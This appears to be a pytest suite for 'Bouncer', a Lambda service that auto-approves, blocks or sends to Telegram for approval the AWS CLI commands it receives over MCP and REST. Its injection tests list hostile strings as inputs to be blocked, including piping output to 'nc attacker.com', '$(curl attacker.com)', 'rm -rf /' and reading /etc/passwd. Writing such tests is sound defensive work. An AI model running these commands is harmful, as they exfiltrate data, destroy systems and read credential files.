"""
Bouncer v2.0.0 測試
包含 MCP JSON-RPC 測試 + 原有 REST API 測試
"""

import json
import sys
import os
import time
import pytest
from unittest.mock import patch, MagicMock
from decimal import Decimal

# Moto for AWS mocking
from moto import mock_aws
import boto3


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def mock_dynamodb():
    """建立 mock DynamoDB 表"""
    with mock_aws():
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        table = dynamodb.create_table(
            TableName='clawdbot-approval-requests',
            KeySchema=[{'AttributeName': 'request_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'request_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        table.wait_until_exists()
        yield dynamodb


@pytest.fixture
def app_module(mock_dynamodb):
    """載入 app 模組並注入 mock"""
    # 設定環境變數
    os.environ['TABLE_NAME'] = 'clawdbot-approval-requests'
    os.environ['REQUEST_SECRET'] = 'test-secret'
    os.environ['TELEGRAM_BOT_TOKEN'] = 'test-token'
    os.environ['APPROVED_CHAT_ID'] = '999999999'
    os.environ['MCP_MAX_WAIT'] = '5'  # 測試用短時間
    
    # 重新載入模組
    if 'app' in sys.modules:
        del sys.modules['app']
    
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
    import app
    
    # 注入 mock table
    app.table = mock_dynamodb.Table('clawdbot-approval-requests')
    app.dynamodb = mock_dynamodb
    
    yield app
    
    sys.path.pop(0)


# ============================================================================
# MCP Tests
# ============================================================================

class TestMCPInitialize:
    """MCP initialize 方法測試"""
    
    def test_initialize_success(self, app_module):
        """測試 MCP initialize"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['jsonrpc'] == '2.0'
        assert body['id'] == 1
        assert 'result' in body
        assert body['result']['serverInfo']['name'] == 'bouncer'
        assert body['result']['protocolVersion'] == '2024-11-05'


class TestMCPToolsList:
    """MCP tools/list 方法測試"""
    
    def test_tools_list(self, app_module):
        """測試列出所有工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 2,
                'method': 'tools/list',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        tools = body['result']['tools']
        tool_names = [t['name'] for t in tools]
        
        assert 'bouncer_execute' in tool_names
        assert 'bouncer_status' in tool_names
        assert 'bouncer_list_safelist' in tool_names


class TestMCPExecuteSafelist:
    """MCP bouncer_execute SAFELIST 測試"""
    
    @patch('subprocess.run')
    def test_execute_safelist_command(self, mock_run, app_module):
        """測試自動批准的命令"""
        mock_run.return_value = MagicMock(
            stdout='{"Reservations": []}',
            stderr='',
            returncode=0
        )
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 3,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 describe-instances'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'auto_approved'
        assert '{"Reservations": []}' in content['result']


class TestMCPExecuteBlocked:
    """MCP bouncer_execute BLOCKED 測試"""
    
    def test_execute_blocked_command(self, app_module):
        """測試被封鎖的命令"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 4,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws iam create-user --user-name hacker'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        assert body['result']['isError'] == True
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'


class TestMCPExecuteApproval:
    """MCP bouncer_execute APPROVAL 測試"""
    
    @patch('app.send_telegram_message')
    def test_execute_needs_approval_timeout(self, mock_telegram, app_module):
        """測試需要審批的命令（超時）"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 5,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'reason': 'Test start',
                        'timeout': 3  # 3 秒超時
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        # 應該超時（因為沒有審批）
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'timeout'
        assert mock_telegram.called
    
    @patch('app.send_telegram_message')
    @patch('subprocess.run')
    def test_execute_approved(self, mock_run, mock_telegram, app_module):
        """測試審批通過的命令"""
        mock_run.return_value = MagicMock(
            stdout='Instance started',
            stderr='',
            returncode=0
        )
        
        # 先建立 pending 請求
        request_id = 'test123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'approved',
            'result': 'Instance started',
            'approver': '999999999'
        })
        
        # 查詢狀態
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 6,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_status',
                    'arguments': {
                        'request_id': request_id
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'approved'
        assert content['result'] == 'Instance started'


class TestMCPListSafelist:
    """MCP bouncer_list_safelist 測試"""
    
    def test_list_safelist(self, app_module):
        """測試列出 safelist"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 7,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_list_safelist',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'safelist_prefixes' in content
        assert 'blocked_patterns' in content
        assert 'aws ec2 describe-' in content['safelist_prefixes']


class TestMCPErrors:
    """MCP 錯誤處理測試"""
    
    def test_invalid_secret(self, app_module):
        """測試無效的 secret"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'wrong-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32600
    
    def test_invalid_jsonrpc_version(self, app_module):
        """測試無效的 jsonrpc 版本"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '1.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert 'jsonrpc must be "2.0"' in body['error']['message']
    
    def test_unknown_method(self, app_module):
        """測試未知方法"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'unknown_method'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32601
    
    def test_unknown_tool(self, app_module):
        """測試未知工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'tools/call',
                'params': {
                    'name': 'unknown_tool',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602


# ============================================================================
# REST API Tests（向後兼容）
# ============================================================================

class TestRESTSafelist:
    """REST API SAFELIST 測試"""
    
    @patch('subprocess.run')
    def test_safelist_auto_approved(self, mock_run, app_module):
        """測試 REST API 自動批准"""
        mock_run.return_value = MagicMock(
            stdout='{"Account": "123456"}',
            stderr='',
            returncode=0
        )
        
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws sts get-caller-identity'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'auto_approved'


class TestRESTBlocked:
    """REST API BLOCKED 測試"""
    
    def test_blocked_command(self, app_module):
        """測試 REST API 封鎖命令"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws iam delete-user --user-name admin'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403
        
        body = json.loads(result['body'])
        assert body['status'] == 'blocked'


class TestRESTApproval:
    """REST API APPROVAL 測試"""
    
    @patch('app.send_telegram_message')
    def test_approval_pending(self, mock_telegram, app_module):
        """測試 REST API 待審批（非等待模式）"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws ec2 stop-instances --instance-ids i-123',
                'wait': False
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 202
        
        body = json.loads(result['body'])
        assert body['status'] == 'pending_approval'
        assert 'request_id' in body
        assert mock_telegram.called


# ============================================================================
# Telegram Webhook Tests
# ============================================================================

class TestTelegramWebhook:
    """Telegram Webhook 測試"""
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    @patch('subprocess.run')
    def test_approve_callback(self, mock_run, mock_answer, mock_update, app_module):
        """測試審批通過 callback"""
        mock_run.return_value = MagicMock(
            stdout='Done',
            stderr='',
            returncode=0
        )
        
        # 建立 pending 請求
        request_id = 'webhook_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'approved'
        assert 'result' in item
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_deny_callback(self, mock_answer, mock_update, app_module):
        """測試拒絕 callback"""
        request_id = 'deny_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 terminate-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb456',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 888}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    def test_unauthorized_user(self, mock_answer, app_module):
        """測試未授權用戶"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb789',
                    'from': {'id': 999999},  # 未授權
                    'data': 'approve:test123',
                    'message': {'message_id': 777}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403


# ============================================================================
# Command Classification Tests
# ============================================================================

class TestCommandClassification:
    """命令分類測試"""
    
    def test_is_blocked(self, app_module):
        """測試 BLOCKED 分類"""
        assert app_module.is_blocked('aws iam create-user --user-name test')
        assert app_module.is_blocked('aws iam delete-role --role-name admin')
        assert app_module.is_blocked('aws sts assume-role --role-arn xxx')
        assert app_module.is_blocked('aws ec2 describe-instances; rm -rf /')
        assert app_module.is_blocked('aws s3 ls | cat /etc/passwd')
        assert app_module.is_blocked('aws lambda invoke $(whoami)')
    
    def test_is_auto_approve(self, app_module):
        """測試 SAFELIST 分類"""
        assert app_module.is_auto_approve('aws ec2 describe-instances')
        assert app_module.is_auto_approve('aws s3 ls')
        assert app_module.is_auto_approve('aws sts get-caller-identity')
        assert app_module.is_auto_approve('aws rds describe-db-instances')
        assert app_module.is_auto_approve('aws logs filter-log-events --log-group xxx')
    
    def test_approval_required(self, app_module):
        """測試需要審批的命令"""
        # 這些不在 blocked 也不在 safelist
        assert not app_module.is_blocked('aws ec2 start-instances --instance-ids i-123')
        assert not app_module.is_auto_approve('aws ec2 start-instances --instance-ids i-123')
        
        assert not app_module.is_blocked('aws s3 rm s3://bucket/file')
        assert not app_module.is_auto_approve('aws s3 rm s3://bucket/file')


# ============================================================================
# Security Tests
# ============================================================================

class TestSecurity:
    """安全測試"""
    
    def test_shell_injection_blocked(self, app_module):
        """測試 shell injection 被封鎖"""
        injections = [
            'aws s3 ls; cat /etc/passwd',
            'aws ec2 describe-instances | nc attacker.com 1234',
            'aws lambda invoke && rm -rf /',
            'aws s3 cp `whoami` s3://bucket/',
            'aws ssm send-command $(curl attacker.com)',
        ]
        
        for cmd in injections:
            assert app_module.is_blocked(cmd), f"Should block: {cmd}"
    
    @patch('subprocess.run')
    def test_execute_only_aws_commands(self, mock_run, app_module):
        """測試只能執行 aws 命令"""
        result = app_module.execute_command('ls -la')
        assert '只能執行 aws CLI 命令' in result
        
        result = app_module.execute_command('cat /etc/passwd')
        assert '只能執行 aws CLI 命令' in result


# ============================================================================
# Integration Tests
# ============================================================================

class TestIntegration:
    """整合測試"""
    
    def test_full_mcp_flow_safelist(self, app_module):
        """測試完整 MCP 流程（SAFELIST）"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                stdout='{"UserId": "123", "Account": "456", "Arn": "arn:aws:iam::456:user/test"}',
                stderr='',
                returncode=0
            )
            
            # Initialize
            init_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 1,
                    'method': 'initialize',
                    'params': {}
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(init_event, None)
            assert result['statusCode'] == 200
            
            # Execute
            exec_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 2,
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws sts get-caller-identity'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(exec_event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'auto_approved'
            assert 'UserId' in content['result']


# ============================================================================
# Status Query Tests
# ============================================================================

class TestStatusQuery:
    """狀態查詢測試"""
    
    def test_status_query_found(self, app_module):
        """測試查詢存在的請求"""
        request_id = 'status_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 describe-instances',
            'status': 'approved',
            'result': 'OK'
        })
        
        event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'approved'
    
    def test_status_query_not_found(self, app_module):
        """測試查詢不存在的請求"""
        event = {
            'rawPath': '/status/nonexistent',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 404


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
